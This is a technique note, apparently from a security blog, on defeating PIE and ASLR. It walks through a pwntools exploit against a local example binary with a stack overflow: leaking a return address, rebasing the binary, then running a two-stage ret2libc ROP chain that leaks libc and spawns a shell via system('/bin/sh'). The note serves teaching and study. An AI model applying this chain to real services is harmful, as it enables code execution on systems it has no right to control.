---
number: 5
title: "Bypassing PIE: Leaking the Base and Landing the Shot"
slug: "bypassing-pie"
date: "2025-05-01"
type: "note"
status: "DISCLOSED"
summary: "Position-Independent Executables move the whole binary under ASLR. A single leaked pointer collapses that entropy and hands you reliable control of RIP."
cves: []
severity: "TECHNIQUE"
timeline:
 - { label: "WRITTEN", date: "2025-05-01" }
 - { label: "PUBLISHED", date: "2025-05-01" }
---

Modern binaries are compiled `-fPIE` by default. That one flag turns the executable itself into a shared object: every load, the loader drops the code, the GOT, and every gadget at a fresh randomized base. Your hardcoded `0x400000` addresses are worthless. The good news is that PIE is not encryption - it's a single unknown offset applied uniformly to the whole image. Leak **one** real address and you've recovered the base for **everything**.

> ASLR is a subtraction problem. Find any pointer into the module, subtract its known static offset, and you own the module's base.

## The setup

Say we have a classic vulnerable service. It prints something helpful, then hands us a stack buffer overflow:

```c
void vuln() {
    char buf[64];
    printf("say something: ");
    read(0, buf, 256);      // 64-byte buffer, 256-byte read - game on
}
```

Compiled with PIE and NX, no stack canary. NX means we can't just drop shellcode on the stack and jump to it, so we're going the ROP route. But ROP needs gadget addresses, and every gadget just moved.

## Get a leak

The whole exploit hinges on the leak primitive. In real targets it comes from a format-string bug, an uninitialized read, an out-of-bounds `printf("%s", ...)`, or - the friendliest case - the binary printing a function pointer or a stack cookie for you. In this example, imagine the binary leaks a return address still sitting on the stack:

```python
from pwn import *

exe = ELF("./chall", checksec=False)
io = process("./chall")

# trigger the leak - however the bug lets us
io.recvuntil(b"leak: ")
leaked = int(io.recvline().strip(), 16)
log.info(f"leaked pointer: {leaked:#x}")
```

## Recover the base

Here's the part people overthink. The leaked value is `base + static_offset`. We know `static_offset` because we can read it straight out of the un-relocated binary. If the leak is a return address into `main+0x2a`, then:

```python
# offset of the leaked symbol *in the file* (PIE base = 0)
LEAK_OFFSET = exe.symbols["main"] + 0x2a
exe.address = leaked - LEAK_OFFSET
log.success(f"PIE base = {exe.address:#x}")
```

The instant you set `exe.address`, pwntools rebases the entire symbol table. `exe.symbols["win"]`, `exe.got["puts"]`, every gadget from `ROP(exe)` - all now point at the live process. PIE is, functionally, defeated.

## Build the chain

With the base known, the rest is textbook. Leak libc via the GOT, resolve `system`, then return into it:

```python
rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address

payload  = b"A" * 72                    # buffer + saved rbp
payload += p64(pop_rdi)
payload += p64(exe.got["puts"])
payload += p64(exe.plt["puts"])         # leak libc's puts@GOT
payload += p64(exe.symbols["vuln"])     # loop back for round two

io.sendline(payload)
libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = libc_leak - libc.symbols["puts"]
log.success(f"libc base = {libc.address:#x}")
```

> A stack-alignment `ret` before the call keeps `movaps` from faulting inside `system` - the single most common reason a "correct" ret2libc chain segfaults on Ubuntu.

Round two lands `system("/bin/sh")` with the now-known libc base:

```python
ret = rop.find_gadget(["ret"]).address
payload  = b"A" * 72
payload += p64(ret)                     # 16-byte align the stack
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols["system"])
io.sendline(payload)
io.interactive()
```

## What actually matters

1. **The leak is the exploit.** Everything after recovering the base is mechanical. 90% of your effort on a PIE target should go into finding and stabilizing the info leak.
2. **Offsets are static; bases are dynamic.** Never hardcode a runtime address. Compute every address as `module.address + file_offset`.
3. **Alignment kills more chains than logic bugs.** If your ret2libc segfaults inside `system`, add a `ret` gadget to realign to 16 bytes before the call.

PIE raises the cost of exploitation, but it raises it by exactly one primitive: the leak. Pay that cost once and the whole address space unfolds.
